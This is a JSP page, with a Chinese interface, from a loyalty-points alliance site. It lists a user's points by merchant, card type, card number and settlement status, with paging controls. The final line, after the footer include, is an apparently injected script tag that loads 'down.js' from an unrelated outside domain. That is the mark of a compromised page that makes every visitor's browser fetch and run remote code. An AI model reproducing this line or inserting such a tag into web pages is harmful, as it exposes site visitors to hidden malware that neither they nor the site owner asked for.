<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-积分列表"/> 
<%@ include file="IncludeTop.jsp" %>
<script type="text/javascript" src="js/pu_city.js"></script>

<table width="780"  border="0" align="center" cellpadding="0" cellspacing="0" >
  <tr> 
    <td valign="top" width="178">
	    <%@ include file="accountBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>	</td>
	<td bgcolor="#FFFFFF" valign="top" width="602"> 
	  <c:set var="trBegin" value='<tr>' />
	  <c:set var="trEnd" value='</tr>' /> 
	  <c:set var="colomnSize" value="1" />
	  
	  <c:set var="startRow" value='0' /> 
	  <c:set var="pageSize" value='20' /> 
	  <c:set var="totalCount" value='3' /> 
	  			
      <table border ="0" width="100%" cellpadding="0" cellspacing="0">
        <tr align="center">
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
        <tr align="center" bgcolor="#ACD1FF"> 
          <td width="35" height="28">序号</td>
          <td width="112">商户</td>
          <td width="77">卡种</td>
          <td width="79">卡号</td>
          <td width="74">积分</td>
          <td width="91">积分时间</td>
          <td width="74">类型</td>
        </tr>
        <c:choose> <c:when  test="${result ne null}"> <c:set var="pointList" value="${result.pointList}"/> 
        <c:set var="totalCount" value="${result.pointCount}"/> <c:forEach var="point" items="${pointList}" varStatus="status"> 
        <tr> 
          <td width="35" height="19" ><c:out value="${status.count}"/></td>
          <td width="112"> <a href='<c:url value="/getMerchantInfo.do"/>?merchantNo=<c:out value="${point.merchantNo}"/>'> 
            <c:out value="${point.merchantName}"/> </a> </td>
          <td width="77"><c:out value="${point.cardName}"/></td>
          <td width="79"><c:out value="${point.cardNo}"/></td>
          <td width="74"><c:out value="${point.point}"/></td>
          <c:choose> <c:when test="${point.pileType eq 'E'}"> 
          <td ><fmt:formatDate value="${point.pendingTime}"  pattern="yyyy-MM-dd"/></td>
          <td >未结算</td>
          </c:when> <c:otherwise> 
          <td ><fmt:formatDate value="${point.pileTime}"  pattern="yyyy-MM-dd"/></td>
          <td >已结算</td>
          </c:otherwise> </c:choose> </tr>
        </c:forEach> </c:when> <c:otherwise> <c:set var="pageSize" value='6' /> 
        <c:set var="totalCount" value="0"/> 
        <tr align="center"> 
          <td colspan="7">暂为空！</td>
        </tr>
        </c:otherwise> </c:choose> 
      </table>
      <table width="100%" border="0" height="60" cellspacing="0" cellpadding="0">
        <tr> 
          <td width="3%" height="57">&nbsp;</td>
          <td width="95%" height="57">
            <form name="pageForm" method="post" action='<c:url value="/queryPoint.do"/>'>
              <c:set var="trEnd" value='</tr>' />
			  <c:choose>
				  <c:when test="${result ne null and result.pointQC ne null}"> 
						<input type="hidden" name="cardNo" value='<c:out value="${result.pointQC.cardNo}"/>' />
						<input type="hidden" name="merchantNo" value='<c:out value="${result.pointQC.merchantNo}"/>' />
						
						<input type="hidden" name="time1" value='<c:out value="${result.pointQC.time1}"/>' />
						<input type="hidden" name="time2" value='<c:out value="${result.pointQC.time2}"/>' />
						<input type="hidden" name="orderBy" value='<c:out value="${result.pointQC.orderBy}"/>' />
						<input type="hidden" name="pageSize" value='<c:out value="${result.pointQC.pageSize}"/>' />
						<input type="hidden" name="startRow" value='<c:out value="${result.pointQC.startRow}"/>' />								
						<input type="hidden" name="orderType" value='<c:out value="${result.pointQC.orderType}"/>' />
						<c:if test="${result.pointQC.startRow ne null}">
							<c:set var="startRow" value="${result.pointQC.startRow}"/>
						</c:if>
						<c:if test="${result.pointQC.pageSize ne null}">
							<c:set var="pageSize" value="${result.pointQC.pageSize}"/>
						</c:if>
				</c:when>
				<c:otherwise>
					 	<input type="hidden" name="startRow" value="0" />
				</c:otherwise> 
			</c:choose>
            <div align="center">
				<c:choose> 
				   <c:when  test="result eq null">
					   <!--  result is null -->		
				   </c:when> 
				   <c:otherwise> 			 
					  <c:choose> 
						  <c:when  test="${startRow lt 1}">
								上一页						 </c:when> 
						 <c:when  test="${startRow - pageSize lt 0}">
								<a href='javascript:pageForm.startRow.value=0; pageForm.submit()'>上一页</a>						 </c:when>
						 <c:otherwise> 
								<a href='javascript:pageForm.startRow.value=<c:out value="${startRow-pageSize}"/>; pageForm.submit()'>上一页</a>						</c:otherwise>
					  </c:choose>
						  <c:set var="totalPage" value="${totalCount / pageSize }"/>
					  <c:if  test="${totalCount mod pageSize ne 0}">
						  <c:set var="totalPage" value="${totalPage + 1}"/>
					  </c:if> 
					  <c:if  test="${totalCount eq 0}">
						  <c:set var="totalPage" value="1"/>
					  </c:if> 
					  <c:forEach begin="1" end="${totalPage}" var="i" step="1"> 		
							<c:set var="curRow" value="${(i-1) * pageSize}"/>
							<c:choose> 
								  <c:when  test="${startRow eq curRow}">
										<c:out value="${i}"/>
								  </c:when> 
								  <c:otherwise> 
										<a href='javascript:pageForm.startRow.value=<c:out value="${(i-1) * pageSize}"/>; pageForm.submit()'><c:out value="${i}"/></a>								  </c:otherwise>						  
							 </c:choose>
					  </c:forEach>
					  <c:choose> 
						 <c:when  test="${startRow gt totalCount - pageSize}">
								下一页						 </c:when> 
						 <c:otherwise> 
								<a href='javascript:pageForm.startRow.value=<c:out value="${startRow+pageSize}"/>; pageForm.submit()'>下一页</a>						</c:otherwise>
					  </c:choose>
				  </c:otherwise>
			   </c:choose>	  
			</div>
   	 	  </form>          </td>
          <td width="2%" height="57">&nbsp;</td>
        </tr>
      </table>	  </td>
    
    <td align="center" valign="top">&nbsp; </td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>